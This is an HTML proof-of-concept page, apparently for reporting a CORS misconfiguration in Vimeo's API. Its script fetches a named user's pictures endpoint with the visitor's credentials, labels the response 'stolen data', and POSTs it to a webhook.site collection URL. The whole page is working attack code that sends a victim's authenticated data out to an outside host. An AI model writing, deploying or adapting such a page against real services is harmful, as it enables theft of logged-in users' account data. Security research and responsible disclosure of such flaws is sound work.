<!DOCTYPE html>
<html>
<head><title>CORS PoC - Vimeo</title></head>
<body>
  <h2>CORS PoC</h2>
  <pre id="output">Fetching data...</pre>

  <script>
    // Step 1: Fetch Vimeo API cross-origin with credentials
    fetch("https://api.vimeo.com/users/258406930/pictures", {
      method: "GET",
      credentials: "include"
    })
    .then(r => r.json())
    .then(data => {

      // Step 2: Show stolen data on page
      document.getElementById("output").textContent 
        = JSON.stringify(data, null, 2);

      // Step 3: Send stolen data to your webhook
      fetch("https://webhook.site/030dc7a2-36ce-48fd-8628-8186901bf6e5", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

    })
    .catch(err => {
      document.getElementById("output").textContent = "Error: " + err;
    });
  </script>
</body>
</html>
